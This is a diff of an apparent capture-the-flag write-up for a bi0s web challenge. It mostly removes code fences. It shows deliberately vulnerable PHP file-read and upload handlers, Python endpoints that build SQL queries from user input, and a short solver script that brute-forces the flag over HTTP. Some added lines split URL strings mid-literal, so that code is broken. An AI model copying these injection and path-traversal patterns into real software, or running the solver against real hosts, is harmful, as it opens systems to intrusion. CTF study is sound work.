@@ -31,11 +31,6 @@
 24
 25
 26
-```
-
-
-
-```
 services:
  frontend:
  build: ./php
@@ -62,11 +57,6 @@ services:
 networks:
  frontend:
  backend:
-```
-
-
-
-```
 1
 2
 3
@@ -77,11 +67,6 @@ networks:
 8
 9
 10
-```
-
-
-
-```
 if(isset($_GET['file'])){
  $file = $_GET['file'];
  $ext = explode('.', $file);
@@ -92,11 +77,6 @@ if(isset($_GET['file'])){
  if(file_exists($file)){
  chdir($FOLDER);
  echo file_get_contents($_GET['file']);
-```
-
-
-
-```
 1
 2
 3
@@ -105,11 +85,6 @@ if(isset($_GET['file'])){
 6
 7
 8
-```
-
-
-
-```
 if($fileSize < 100000){
  $name = uniqid('', true).".".$fileActualExt;
  $fileDestination = $FOLDER.$_POST['path'];
@@ -118,23 +93,8 @@ if($fileSize < 100000){
  }else{
  $error = "Your file is too big!";
  }
-```
-
-
-
-```
 1
-```
-
-
-
-```
 if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag")
-```
-
-
-
-```
 1
 2
 3
@@ -143,11 +103,6 @@ if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.head
 6
 7
 8
-```
-
-
-
-```
 if(r.Header.Get("X-pro-hacker")!=""){
  fmt.Fprintf(w, "Hello Hacker!\n")
  return
@@ -156,11 +111,6 @@ if(strings.Contains(r.Header.Get("flag"), "gimme")){
  fmt.Fprintf(w, "No flag For you!\n")
  return
 }
-```
-
-
-
-```
 1
 2
 3
@@ -177,18 +127,13 @@ if(strings.Contains(r.Header.Get("flag"), "gimme")){
 14
 15
 16
-```
-
-
-
-```
 CREATE TABLE IF NOT EXISTS users (
- username TEXT, 
+ username TEXT,
  token TEXT
  );
 CREATE TABLE IF NOT EXISTS flag (
  flag_is_here TEXT
- ); 
+ );
 Delete from users;
 Delete from flag;
 INSERT INTO users values ('user','some_randomtoken'),
@@ -198,11 +143,6 @@ INSERT INTO users values ('user','some_randomtoken'),
  '{FLAG}'
  );
 INSERT INTO flag values ('{FLAG}');
-```
-
-
-
-```
 1
 2
 3
@@ -218,49 +158,30 @@ INSERT INTO flag values ('{FLAG}');
 13
 14
 15
-```
-
-
-
-```
-if request.headers.get("Token"): 
+if request.headers.get("Token"):
  token = request.headers.get("Token")
  token = token[:16]
  token = token.replace(" ","").replace('"',"")
  if request.form.get("user"):
  user = request.form.get("user")
  user = user[:38]
- add_user(user,token) 
+ add_user(user,token)
  query = f'SELECT * FROM users WHERE token="{token}"'
  res = db_query(query)
  res = res.fetchone()
  return res[1] if res and len(res[0])>0 else "INDEX\n"
- except Exception as e:
- print(e) 
+ 
+except Exception as e:
+ print(e)
  return "INDEX\n"
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 def add_user(user,token):
  q = f"INSERT INTO users values ('{user}','{token}')"
  db_query(q)
  return
-```
-
-
-
-```
 1
 2
 3
@@ -307,17 +228,14 @@ def add_user(user,token):
 44
 45
 46
-```
-
-
-
-```
 import requests
 import re
-import string 
+import string
 
-#url = "http://localhost:8000"
-url = "http://web.chall.bi0s.in:8000"
+    #url = "http://localhost:
+8000"
+url = "http://web.chall.bi0s.in:
+8000"
 
 S = requests.Session()
 S.get(url)
@@ -352,7 +270,7 @@ for i in range(1,10):
 
  res = S.get(url+f"/view.php?fol=.&file={file}").text
 
- match = re.findall("not found</div>(.)",res)[0]
+ match = re.findall("not found(.)",res)[0]
  #print(res)
  if letter == match:
  flag += letter
